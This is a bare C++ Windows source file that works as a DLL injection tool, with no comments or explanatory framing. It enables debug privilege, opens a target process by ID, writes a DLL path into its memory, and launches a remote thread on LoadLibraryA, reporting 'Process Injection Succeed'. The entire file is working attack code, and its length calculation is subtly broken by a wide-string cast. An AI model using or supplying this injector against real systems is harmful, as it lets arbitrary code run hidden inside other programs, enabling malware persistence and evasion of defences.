#include <windows.h>
#include <userenv.h>
#include <iostream>
#include <tchar.h>
#include "stdlib.h"
#pragma comment(lib,"ws2_32.lib")
#pragma comment (lib,"Advapi32.lib")
#pragma comment (lib,"Iphlpapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "userenv.lib")

using namespace std;

int main(int argc, char* argv[]) {
	DWORD ProcessID = atoi(argv[1]);
	cout << ProcessID << endl;
	HANDLE CurrentToken;
	LUID SeDebugNameValue;
	TOKEN_PRIVILEGES TokenProvoleges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &CurrentToken)){
		cout << "We Need Administrator Priveileges!" << endl;
		return 0;
	}
	
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDebugNameValue)) { 
		CloseHandle(CurrentToken); 
		cout << "We Need Administrator Priveileges!" << endl; 
		return 0; 
	}
	
	TokenProvoleges.PrivilegeCount = 1;
	TokenProvoleges.Privileges[0].Luid = SeDebugNameValue;
	TokenProvoleges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!AdjustTokenPrivileges(CurrentToken, FALSE, &TokenProvoleges, sizeof TokenProvoleges, NULL, NULL)) { 
		CloseHandle(CurrentToken); 
		cout << "We Need Administrator Priveileges!" << endl; 
		return 0; 
	}
	
	CloseHandle(CurrentToken);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);
	if (hProcess == 0) { 
		cout << "[-] Open Process Failed! Got System Error Code: " << GetLastError() << endl; 
		CloseHandle(hProcess); 
		return 0; 
	}
	char* DLLFileName = argv[2];
	DWORD Size = 1 + lstrlen((LPCWSTR)DLLFileName);
	LPVOID DLLAddr = NULL;
	DLLAddr = VirtualAllocEx(hProcess, NULL, Size, MEM_COMMIT, PAGE_READWRITE);
	if (DLLAddr == NULL) {
		cout << "[-] Memory Alloc Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	if (!WriteProcessMemory(hProcess, DLLAddr, DLLFileName, Size, NULL)) {
		cout << "[-] Write Process Memory Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}

	HMODULE hModule = GetModuleHandle(_T("kernel32.dll"));

	cout << hModule << ":-:" << GetLastError() << endl;

	FARPROC pFuncProcAddr = GetProcAddress(hModule, (LPCSTR)"LoadLibraryA");
	if (pFuncProcAddr == NULL) {
		cout << "[-] Get Process Address Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}

	HANDLE RemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, DLLAddr, 0, NULL);
	if (RemoteThread == NULL) {
		cout << "[-] Create Remote Thread Failed! Got System Error Code: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return 0;
	}
	cout << "[+] Process Injection Succeed!" << endl;
	return 0;
}
